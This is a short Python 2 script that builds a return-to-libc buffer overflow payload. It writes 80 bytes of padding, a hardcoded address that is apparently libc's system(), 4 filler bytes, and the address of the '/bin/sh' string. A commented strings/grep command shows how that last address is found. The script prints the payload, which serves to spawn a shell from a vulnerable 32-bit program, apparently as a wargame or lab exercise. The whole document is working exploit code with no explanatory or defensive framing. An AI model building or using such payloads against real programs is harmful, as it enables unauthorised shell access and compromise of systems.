#!/usr/bin/python
import struct

padding = 'A'*(80)
sys_addr = struct.pack("I", 0xb7ed0000)
padding2 = 'B'*4
#strings -a -t x /lib/libc-.... | grep "/bin/sh" 
addr = struct.pack("I",0xb7fb68bf)

print padding + sys_addr + padding2 + addr
